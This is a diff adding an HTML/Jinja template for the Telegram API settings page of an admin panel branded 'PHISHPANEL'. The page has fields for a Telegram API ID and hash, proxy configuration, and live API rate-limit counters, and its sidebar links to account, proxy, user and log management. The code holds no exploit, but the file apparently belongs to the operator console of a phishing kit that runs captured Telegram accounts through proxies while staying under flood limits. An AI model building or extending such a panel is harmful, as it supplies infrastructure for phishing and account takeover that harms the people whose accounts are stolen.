@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Настройки API | Telegram Panel</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; background: #0a0a0a; }
+        .glass-card { background: rgba(255,255,255,0.03); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.05); }
+    </style>
+</head>
+<body class="text-gray-100">
+    <div class="min-h-screen flex">
+        <!-- Sidebar (same as dashboard) -->
+        <aside class="w-64 glass-card border-r border-gray-800/50 p-6 fixed h-full">
+            <!-- ... same sidebar as in dashboard ... -->
+            <div class="mb-8">
+                <h1 class="text-xl font-black tracking-tighter text-white">PHISH<span class="text-green-500">PANEL</span></h1>
+                <div class="flex items-center gap-2 mt-2">
+                    <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
+                    <span class="text-[10px] text-gray-500 uppercase">Active • v3.0</span>
+                </div>
+            </div>
+
+            <nav class="space-y-2">
+                <a href="/admin/dashboard" class="flex items-center gap-3 px-4 py-3 hover:bg-white/5 rounded-xl text-gray-400 hover:text-white transition">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2V6zM14 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2V6zM4 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2zM14 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2v-2z"></path>
+                    </svg>
+                    <span>Дашборд</span>
+                </a>
+                <a href="/admin/accounts" class="flex items-center gap-3 px-4 py-3 hover:bg-white/5 rounded-xl text-gray-400 hover:text-white transition">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+                    </svg>
+                    <span>Аккаунты</span>
+                </a>
+                <a href="/admin/proxies" class="flex items-center gap-3 px-4 py-3 hover:bg-white/5 rounded-xl text-gray-400 hover:text-white transition">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"></path>
+                    </svg>
+                    <span>Прокси</span>
+                </a>
+                <a href="/admin/api-settings" class="flex items-center gap-3 px-4 py-3 bg-white/10 rounded-xl text-white">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path>
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
+                    </svg>
+                    <span>API</span>
+                </a>
+                <a href="/admin/users" class="flex items-center gap-3 px-4 py-3 hover:bg-white/5 rounded-xl text-gray-400 hover:text-white transition">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197M13 7a4 4 0 11-8 0 4 4 0 018 0z"></path>
+                    </svg>
+                    <span>Пользователи</span>
+                </a>
+                <a href="/admin/logs" class="flex items-center gap-3 px-4 py-3 hover:bg-white/5 rounded-xl text-gray-400 hover:text-white transition">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+                    </svg>
+                    <span>Логи</span>
+                </a>
+                <a href="/admin/settings" class="flex items-center gap-3 px-4 py-3 hover:bg-white/5 rounded-xl text-gray-400 hover:text-white transition">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path>
+                    </svg>
+                    <span>Настройки</span>
+                </a>
+            </nav>
+
+            <div class="absolute bottom-6 left-6 right-6">
+                <a href="/admin/logout" class="flex items-center gap-3 px-4 py-3 bg-red-500/10 text-red-500 rounded-xl hover:bg-red-500/20 transition">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"></path>
+                    </svg>
+                    <span>Выйти</span>
+                </a>
+            </div>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="flex-1 ml-64 p-8">
+            <div class="max-w-4xl">
+                <h2 class="text-3xl font-light mb-2">Настройки API Telegram</h2>
+                <p class="text-gray-500 text-sm mb-8">Управление подключением к Telegram API</p>
+
+                <!-- API Credentials -->
+                <div class="glass-card rounded-2xl p-6 mb-8">
+                    <h3 class="text-lg font-medium mb-6">API Credentials</h3>
+                    
+                    <div class="space-y-6">
+                        <div>
+                            <label class="block text-sm text-gray-400 mb-2">API ID</label>
+                            <div class="flex gap-4">
+                                <input type="text" id="apiId" value="{{ settings.api_id|default('') }}" 
+                                       class="flex-1 bg-black/50 border border-gray-800 rounded-xl p-3 text-sm text-gray-300 font-mono"
+                                       placeholder="1234567">
+                                <button onclick="testConnection()" 
+                                        class="px-6 py-3 bg-green-500/20 text-green-500 rounded-xl text-sm hover:bg-green-500/30 transition flex items-center gap-2">
+                                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path>
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                                    </svg>
+                                    Проверить
+                                </button>
+                            </div>
+                        </div>
+
+                        <div>
+                            <label class="block text-sm text-gray-400 mb-2">API Hash</label>
+                            <input type="password" id="apiHash" value="{% if settings.api_hash_configured %}••••••••••••••••{% endif %}" 
+                                   class="w-full bg-black/50 border border-gray-800 rounded-xl p-3 text-sm text-gray-300 font-mono"
+                                   placeholder="ваш_api_hash">
+                        </div>
+
+                        <div class="flex gap-4">
+                            <button onclick="saveApiSettings()" 
+                                    class="px-6 py-3 bg-blue-500/20 text-blue-500 rounded-xl text-sm hover:bg-blue-500/30 transition">
+                                Сохранить настройки
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Proxy Settings -->
+                <div class="glass-card rounded-2xl p-6 mb-8">
+                    <h3 class="text-lg font-medium mb-6">Прокси для API</h3>
+                    
+                    <div class="space-y-4">
+                        <div class="flex items-center gap-4">
+                            <label class="flex items-center gap-2">
+                                <input type="checkbox" id="proxyEnabled" {% if settings.proxy_enabled %}checked{% endif %} 
+                                       class="form-checkbox bg-black/50 border-gray-800 rounded text-green-500">
+                                <span class="text-sm">Использовать прокси</span>
+                            </label>
+                        </div>
+
+                        <div class="grid grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-sm text-gray-400 mb-2">Тип</label>
+                                <select id="proxyType" class="w-full bg-black/50 border border-gray-800 rounded-xl p-3 text-sm">
+                                    <option value="socks5" {% if settings.proxy_type == 'socks5' %}selected{% endif %}>SOCKS5</option>
+                                    <option value="http" {% if settings.proxy_type == 'http' %}selected{% endif %}>HTTP</option>
+                                    <option value="https" {% if settings.proxy_type == 'https' %}selected{% endif %}>HTTPS</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block text-sm text-gray-400 mb-2">Хост</label>
+                                <input type="text" id="proxyHost" value="{{ settings.proxy_host|default('') }}" 
+                                       class="w-full bg-black/50 border border-gray-800 rounded-xl p-3 text-sm">
+                            </div>
+                            <div>
+                                <label class="block text-sm text-gray-400 mb-2">Порт</label>
+                                <input type="number" id="proxyPort" value="{{ settings.proxy_port|default('') }}" 
+                                       class="w-full bg-black/50 border border-gray-800 rounded-xl p-3 text-sm">
+                            </div>
+                            <div>
+                                <label class="block text-sm text-gray-400 mb-2">Логин (опционально)</label>
+                                <input type="text" id="proxyUsername" value="{{ settings.proxy_username|default('') }}" 
+                                       class="w-full bg-black/50 border border-gray-800 rounded-xl p-3 text-sm">
+                            </div>
+                            <div>
+                                <label class="block text-sm text-gray-400 mb-2">Пароль (опционально)</label>
+                                <input type="password" id="proxyPassword" value="" 
+                                       class="w-full bg-black/50 border border-gray-800 rounded-xl p-3 text-sm">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- API Limits -->
+                <div class="glass-card rounded-2xl p-6">
+                    <h3 class="text-lg font-medium mb-6">Лимиты Telegram API</h3>
+                    
+                    <div class="grid grid-cols-3 gap-6" id="limitsContainer">
+                        <div class="text-center">
+                            <p class="text-gray-500 text-sm mb-2">Flood Wait</p>
+                            <p class="text-2xl font-bold text-yellow-500" id="floodWait">0с</p>
+                        </div>
+                        <div class="text-center">
+                            <p class="text-gray-500 text-sm mb-2">RPS</p>
+                            <p class="text-2xl font-bold text-blue-500" id="currentRps">0/30</p>
+                        </div>
+                        <div class="text-center">
+                            <p class="text-gray-500 text-sm mb-2">Сегодня</p>
+                            <p class="text-2xl font-bold text-green-500" id="dailyRequests">0/100k</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        async function testConnection() {
+            const btn = event.target.closest('button');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '<span class="animate-pulse">Проверка...</span>';
+            btn.disabled = true;
+            
+            try {
+                const response = await fetch('/admin/api/settings/telegram/test', {
+                    method: 'POST'
+                });
+                const result = await response.json();
+                
+                if (result.success) {
+                    alert('✅ Подключение успешно!');
+                } else {
+                    alert(`❌ Ошибка: ${result.message}`);
+                }
+            } catch (error) {
+                alert('❌ Ошибка соединения');
+            } finally {
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+            }
+        }
+
+        async function saveApiSettings() {
+            const data = {
+                api_id: document.getElementById('apiId').value,
+                api_hash: document.getElementById('apiHash').value,
+                proxy_enabled: document.getElementById('proxyEnabled').checked,
+                proxy_type: document.getElementById('proxyType').value,
+                proxy_host: document.getElementById('proxyHost').value,
+                proxy_port: document.getElementById('proxyPort').value,
+                proxy_username: document.getElementById('proxyUsername').value,
+                proxy_password: document.getElementById('proxyPassword').value
+            };
+            
+            const response = await fetch('/admin/api/settings/telegram', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+            
+            if (response.ok) {
+                alert('Настройки сохранены');
+            } else {
+                alert('Ошибка при сохранении');
+            }
+        }
+
+        // Загрузка лимитов
+        async function loadLimits() {
+            const response = await fetch('/admin/api/limits');
+            const data = await response.json();
+            
+            document.getElementById('floodWait').textContent = data.flood_wait.current + 'с';
+            document.getElementById('currentRps').textContent = data.requests_per_second.current + '/' + data.requests_per_second.max;
+            document.getElementById('dailyRequests').textContent = data.daily_requests.current + '/' + (data.daily_requests.max/1000).toFixed(0) + 'k';
+        }
+        
+        loadLimits();
+        setInterval(loadLimits, 10000);
+    </script>
+</body>
+</html>
